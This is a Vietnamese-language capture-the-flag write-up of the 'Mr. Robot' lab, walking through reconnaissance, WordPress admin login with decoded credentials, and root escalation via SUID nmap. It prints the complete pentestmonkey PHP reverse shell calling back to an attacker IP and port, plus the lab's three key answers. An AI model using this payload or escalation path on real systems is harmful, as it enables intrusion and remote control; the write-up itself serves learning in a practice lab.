![Screenshot 2024-02-28 223557](https://hackmd.io/_uploads/ByNt4Rnhp.png)

![Screenshot 2024-02-28 224039](https://hackmd.io/_uploads/rJqY4An2a.png)

Sau khi Start Machine , ta nhận được một IP mục tiêu: `10.10.17.126`. Việc đầu tiên cần làm là thực hiện quét `Nmap` để xem các dịch vụ nào đang chạy trên máy mục tiêu:

![Screenshot 2024-02-28 224434](https://hackmd.io/_uploads/SknCrR2ha.png)

Có `http/https` và `ssh` đang chạy trên máy mục tiêu, truy cập trang web với địa chỉ trên ta được các đoạn phim như trích trong phim về an ninh mạng: `Mr.Robots`😶.Dừng xem một tí cho vui =))) 

![Screenshot 2024-02-28 224819](https://hackmd.io/_uploads/rk_zIAhn6.png)

Thử truy cập robots.txt xem có gì nào , ta thấy 2 file như bên dưới: 

![Screenshot 2024-02-28 225234](https://hackmd.io/_uploads/r1mvPC3h6.png)

Hmm, tìm được key đầu tiên của labs : 

![Screenshot 2024-02-28 225359](https://hackmd.io/_uploads/rkFtPRh2a.png)

*Answer: Key_1_of_3 : 073403c8a58a1f80d943455fb30724b9*
(Key dạng gì mà form lạ thế không biết 🫠)

Hai Key còn lại nằm đâu ta , ta thấy có file kỳ lạ `fsocity.dic` bên trang `robots.txt` ,tải về để xem có gì k0 :/ 

![Screenshot 2024-02-28 230214](https://hackmd.io/_uploads/rJ2HY0hhp.png)

Hmm, một file wordlist với hơn 800000 dòng "-" .Thử chạy `gobuster` với wordlist trên để khám phá các file và thư mục ẩn trên web xem:

![Screenshot 2024-02-28 230729](https://hackmd.io/_uploads/ryXDsRhnp.png)

![Screenshot 2024-02-28 231118](https://hackmd.io/_uploads/HJYwoCh2p.png)

View qua các trang `/images` , `/css` , ta đều bị chặn , truy cập site có status 200 `/license`:

![Screenshot 2024-02-28 230934](https://hackmd.io/_uploads/SJ-RoRn26.png)

Lướt xuống cuối trang có đoạn dạng như base64: `ZWxsaW90OkVSMjgtMDY1Mgo=`. Đem đi decode ta được `elliot:ER28-0652`

![image](https://hackmd.io/_uploads/HyFB2R2h6.png)

Dường như đây là username:passwd đăng nhập , truy cập `/login` được tìm thấy bên trên, ta được chuyển hướng đến trang login `/wp-login.php`: 

![Screenshot 2024-02-28 231851](https://hackmd.io/_uploads/ByAbT0hna.png)

Thử đăng nhập với `elliot:ER28-0652`: 

![Screenshot 2024-02-28 232038](https://hackmd.io/_uploads/Hk1p6A226.png)

![Screenshot 2024-02-29 000120](https://hackmd.io/_uploads/B1TzQxa3p.png)

Một trang quản trị nội dung `wordpress` xuất hiện , ta tìm thấy phiên bản ở cuối trang là version 4.3.1 :  

![Screenshot 2024-02-28 232543](https://hackmd.io/_uploads/B1s6CR2ha.png)

Hmm, thử search CVE cho version wordpress này xem sao.
Ta tìm được vul về **RCE(Remote Code Execution)** trên phiên bản này. Edit content một file php bất kỳ: page.php, sử dụng payload *[php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)* của *pentestmonkey*:

```
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.17.122.154';  // Sử dụng ifconfig để lấy ip máy đang sử dụng😗
$port = 12345;       // Chọn port 12345 để listen kết nối đến🫠
//Còn lại giữ nguyên theo payload gốc😶
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
```

![Screenshot 2024-02-28 235617](https://hackmd.io/_uploads/BypTSJ6nT.png)

Update edit file. Trước khi load site page.php , sử dụng netcat để lắng nghe kết nối đến : 

![Screenshot 2024-02-28 235506](https://hackmd.io/_uploads/rkSM81p26.png)

Truy cập *10.10.17.126/wp-content/themes/twentyfifteen/page.php* , ngay lập tức , ta nhận được reverse-shell kết nối qua terminal: 

![Screenshot 2024-02-29 000656](https://hackmd.io/_uploads/H1YH_ya36.png)

Hmm, ta nhận được shell *non-interactive* *sh* (shell non-interactive hạn chế các tính năng tương tác shell trên hệ thống)
Kiểm tra tiến trình với `ps` , kiểm tra python trên hệ thống:

![Screenshot 2024-02-29 001111](https://hackmd.io/_uploads/HkDDKJa3a.png)

Thực hiện nâng cấp shell interactive với `bash` shell sử dụng python: `python -c 'import pty;pty.spawn("/bin/bash")';`
Lệnh trên tạo ra một thiết bị terminal mới và khởi chạy shell `bash` bên trong nó: (cú pháp thì tự search gg🫠:*[upgrade-linux-shell](https://zweilosec.github.io/posts/upgrade-linux-shell/)* )

![image](https://hackmd.io/_uploads/rkKdiJT26.png)

Thực hiện tìm kiếm file key thứ 2 : `find / -name "key-3*" 2> /dev/null `(chuyển hướng Error qua /dev/null để tránh bị out phiên shell nhé😗)

![image](https://hackmd.io/_uploads/BkLJ1ephp.png)
Cd to /home/robot and cat it : 

![image](https://hackmd.io/_uploads/BJoyeeThp.png)

Chỉ người dùng robot mới có quyền read trên file , hmm , ta có quyền đọc trên file `password.raw-md5` ,cat thử xem : 

![image](https://hackmd.io/_uploads/rkDSxgan6.png)

Đem crack hash md5 trên [crackstation.net](https://crackstation.net/) thử xem : 

![image](https://hackmd.io/_uploads/HJiXbe6ha.png)

May dễ hash và lấy được `abcdefghijklmnopqrstuvwxyz` 🫠. File ghi password mà của robot thì thì thử switch qua người dùng robot xem😗 : 

![image](https://hackmd.io/_uploads/H1wYfl636.png)

Ớ vào được robot kìa😶, đọc file key thôi😶

![image](https://hackmd.io/_uploads/rk_6zxpna.png)

*Answer: Key-2-of-3: 822c73956184f694993bede3eb39f959*

Xong key 2 ,***where is key3 located?*** 🤔.
Thử search file với keyword là "key" vẫn không ra key 3 =(( 

![image](https://hackmd.io/_uploads/B1HjVep2T.png)

Thử` ls -l /` xem: 

![image](https://hackmd.io/_uploads/Sko-Hl63T.png)

Vậy file key 3 chắc chỉ có thể nằm trong `/root` ,hoặc `/lost+found` , mà sao trong` /lost+found` được chứ 🫠.
Thử kiếm xem các file thực thi có quyền SUID (file sẽ được thực thi với quyền cao nhất) nào không: `find / -type -perm -4001` (-4001 ở đây chỉ định các file có ít nhất các quyền **SUID** và **Excecute** trở lên , man find sẽ rõ hơn😗)

![image](https://hackmd.io/_uploads/H1j4Rgana.png)

Search một hồi và xem các gợi ý , ta chú ý có file nmap có thể thực thi shell command: [nmap_gtfobins](https://gtfobins.github.io/gtfobins/nmap/) 

![image](https://hackmd.io/_uploads/H1ut0xan6.png)

![image](https://hackmd.io/_uploads/ByydRlph6.png)

Thực thi nmap --interactive , !sh :-1: 

![image](https://hackmd.io/_uploads/Syl1kWpnp.png)

Vậy là vào được root roy😁. Run ls -l /root xem: 

![image](https://hackmd.io/_uploads/Bk2HkW63a.png)

Cuối cùng cũng tìm được file key thứ 3 , cat it and solved😀
*Answer: 04787ddef27c3dee1ee161b21670b4e4*
